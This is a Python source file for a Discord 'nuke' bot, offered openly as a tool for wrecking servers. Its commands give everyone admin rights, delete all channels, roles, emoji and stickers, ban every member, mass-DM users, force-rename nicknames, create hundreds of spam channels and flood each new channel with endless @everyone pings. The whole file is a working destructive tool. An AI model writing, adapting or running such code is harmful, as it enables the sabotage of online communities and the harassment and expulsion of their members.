import discord
from discord.ext import commands
import requests
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio

token = ""

SPAM_CHANNEL = ["nuked by daddy named TIOND"]
SPAM_MESSAGE = ["@everyone @here"]
role_name = "BYE BYE SERVER"

intents = discord.Intents().all()
bot = commands.Bot(command_prefix='.', intents=intents)
bot.remove_command("help")

@bot.event
async def on_ready():
  print("""
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+-*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.  %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*:-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%+*@@@@@@@@@@@@@@@@@@@@@@@@#..*@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@+  =@@@@@@@@@@@@@@@@@@@@@@@*  +@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%-.=@@@@@@@@@@#-@@@@@@@@@@@@*+@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-.@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@# .%@@@@@@@@-:@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@%=@@@@@@@@@-  #@@@@@@%: :@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@%.#@@@@@@@#   +@@@@@@:  -@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@% :@@@@@@@-   =@@@@@-   -@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@%. *@@@@@#    -@@@@+    =@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@%. :@@@@@-    :@@@#.    +@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@%.  +@@@#     :@@%:     *@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@%.  .%@@:     .@@-      #@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@%.   +@+      .@+      .%@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@%.   .*.      .*.      :@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@%.            ..       -@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@%.                     =@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@.                     *@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@:                     #@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@:                    .@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@:                    :@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@-                    =@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@-                    *@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@=                   .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@=                   :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@+                   +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@*::...              #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%###***++=-:. -@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@******%@%%@@@@@@@@@@@@@@@@@@@@@@@@*****%@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@%--==--%#-=%@@@@@@@@@@@@@@@@@@@@@@@===--=*@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@#*==+#@%##@@@@@@@@@@@@@@@@@@@@@@@@==+#+==%@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@%==#@@@@@@@@@%%@@@@@@@@%@@@@@@@@@==+@#==%@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@#==#@@#==@@%===+%@%==*==*@@@@@@@@==+@#==#@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@#==#@@#-=@@=-++-+@%==++==@@@@@@@@==+@#==#@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@#==#@@#==@%==%#-=@%==%#==@@@@@@@@==+@#==#@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@#==#@@#==@%==%#==@%==%#==@@@@@@@@==+@#==#@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@#==#@@#==@%==%#==@%==%#==@@@@@@@@==+@#==#@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@#==#@@#==@%==%#==@%==%#==@@@@@@@@==+@#==#@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@#==#@@#==@%==%#==@%==%#==@@@@@@@@==+@+==%@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@#=-#@@#-=@@=-++-+@%==%#-=@@@@@@@@=====-+@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@%==#@@#=+@@%+==+@@%=+%#=+@@@@@@@@+++++*@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=-==-+@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@######@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
""")
  print(f'{bot.user.name} has connected to Discord!')


@bot.command()
@commands.is_owner()
async def stop(ctx):
  await ctx.bot.logout()
  print(Fore.GREEN + "logged out successfully." + Fore.RESET)

@bot.command()
async def help(ctx):
  await ctx.message.delete()
  embed = discord.Embed(title="NUKE COMMANDS", color=discord.Colour.blue())
  embed.add_field(name=".nuke", value=".nuke runs every command the bot has", inline=False)
  embed.add_field(name=".admin", value=".admin gives everyone admin", inline=False)
  embed.add_field(name=".ban", value=".ban(userid to exclude from ban) the userid is optional and bans everyone except ppl listed from the userid \n example: .ban 123456789012345678 234567890123456789", inline=False)
  embed.add_field(name=".edit", value=".edit(name) change the server name and icon and banner add your pictures in this directory", inline=False)
  embed.add_field(name=".dchannel", value=".dchannel deletes every channel", inline=False)
  embed.add_field(name=".dtickers", value=".dtickers deletes every stickers", inline=False)
  embed.add_field(name=".demoji", value=".demoji deletes every emoji", inline=False)
  embed.add_field(name=".croles", value=".croles(name) create roles and name them as 'name'", inline=False)
  embed.add_field(name=".dm", value=".dm(message) dms every member in the server", inline=False)
  embed.add_field(name=".cname", value=".cname(name) changes every member in the server to that nickname", inline=False)

  await ctx.author.send(embed=embed)
    


@bot.command()
async def nuke(ctx):
    guild = ctx.guild
    await ctx.message.delete()
    await admin(ctx)
    await edit(ctx, "NUKED BY TION_D")
    await dchannel(ctx)
    await droles(ctx)
    await dstickers(ctx)
    await demoji(ctx)
    await croles(ctx, "Nuked by your daddy tion", 50)
    await guild.create_text_channel("NUKED BY TIOND")
    await ban(ctx)
  
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age=0, max_uses=0)
        print(f"New Invite: {link}")

    amount = 700
    for i in range(amount):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))

    print(f"nuked {guild.name} Successfully.")
    
@bot.command()
async def admin(ctx):
  guild = ctx.guild
  try:
    role = discord.utils.get(guild.roles, name="@everyone")
    await role.edit(permissions=Permissions.all())
    print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
  except:
    print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)

@bot.command()
async def edit(ctx, name: str = "NUKED BY TION_D"):
  guild = ctx.guild
  try:
    await guild.edit(name=name)
    print(f"Server name changed to {name}.")
  except discord.Forbidden:
    print("I don't have permission to change the server name.")
  except discord.HTTPException:
    print("Failed to change the server name due to an HTTP error.")
  try:
    with open('icon.png', 'rb') as icon_file:
        icon = icon_file.read()
    await guild.edit(icon=icon)
    print("Server icon updated successfully.")
  except FileNotFoundError:
    print("Icon file not found.")
  except discord.Forbidden:
    print("I don't have permission to change the server icon.")
  except discord.HTTPException:
    print("Failed to change the server icon due to an HTTP error.")

  try:
    with open('banner.png', 'rb') as banner_file:
      banner = banner_file.read()
    await guild.edit(banner=banner)
    print("Server banner updated successfully.")
  except FileNotFoundError:
    print("Banner file not found.")
  except discord.Forbidden:
    print("I don't have permission to change the server banner.")
  except discord.HTTPException:
    print("Failed to change the server banner due to an HTTP error.")


@bot.command()
async def dstickers(ctx):
  stickers = ctx.guild.stickers
  for sticker in stickers:
    try:
        await sticker.delete()
        print(f"Deleted sticker: {sticker.name}")
    except discord.Forbidden:
        print(f"Missing Permissions to delete sticker: {sticker.name}")
        break
    except discord.HTTPException as e:
        print(f"Failed to delete sticker {sticker.name} due to HTTP error: {e}")
        break
    except Exception as e:
        print(f"An unexpected error occurred while deleting sticker {sticker.name}: {e}")
        break 
      
@bot.command()
async def demoji(ctx):
  for emoji in list(ctx.guild.emojis):
    try:
      await emoji.delete()
      print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
    except:
      print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
  
@bot.command()
async def droles(ctx):
  for role in ctx.guild.roles:
    if role.is_default():
      continue
    try:
      await role.delete()
      print(f"Deleted role: {role.name}")
    except discord.Forbidden:
      print(f"Missing Permissions to delete {role.name}")
    except discord.HTTPException as e:
      print(f"Failed to delete {role.name} due to HTTP error: {e}")
    except Exception as e:
      print(f"An unexpected error occurred while deleting {role.name}: {e}")


@bot.command()
async def croles(ctx, role_name: str, num_roles: int):
  for _ in range(num_roles):
    try:
      await ctx.guild.create_role(name=role_name)
      print(f"Created role: {role_name}")
    except discord.Forbidden:
      print(f"Missing Permissions to create roles.")
      break
    except discord.HTTPException as e:
      print(f"Failed to create role due to HTTP error: {e}")
      break
    except Exception as e:
      print(f"An unexpected error occurred: {e}")
      break

@bot.command()
async def ban(ctx, *exclude: discord.User):
  excluded_ids = [user.id for user in exclude]
  guild = ctx.guild

  for member in guild.members:
    if member.id in excluded_ids or member == bot.user:
      continue
    try:
      await member.ban(reason="BANNEDDDDDDD")
      print(Fore.MAGENTA + f"{member.name}#{member.discriminator} was banned." + Fore.RESET)
    except Exception as e:
      print(Fore.GREEN + f"{member.name}#{member.discriminator} was unable to be banned. Reason: {e}" + Fore.RESET)


@bot.command()
async def dchannel(ctx):
   guild = ctx.guild
   for channel in guild.channels:
    try:
      await channel.delete()
      print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
    except:
      print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
   

@bot.command()
async def dm(ctx, *, message: str):
  members = ctx.guild.members
  for member in members:
    if member.bot:
        continue
    try:
      await member.send(message)
      print(f"Message sent to: {member.name}")
    except discord.HTTPException as e:
      print(f"Failed to send message to {member.name}: {e}")
    except discord.Forbidden:
      print(f"Cannot send messages to {member.name}")

@bot.command()
async def cname(ctx, *, new_nick: str):
  guild = ctx.guild
  members = guild.members
  for member in members:
    try:
      if member == bot.user:
          continue
      await member.edit(nick=new_nick)
      await asyncio.sleep(0.2)
    except discord.Forbidden:
        print(f"Do not have permission to change nickname for {member.name}")
    except discord.HTTPException as e:
        print(f"Failed to change nickname for {member.name}: {str(e)}")

@bot.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))

bot.run(token)
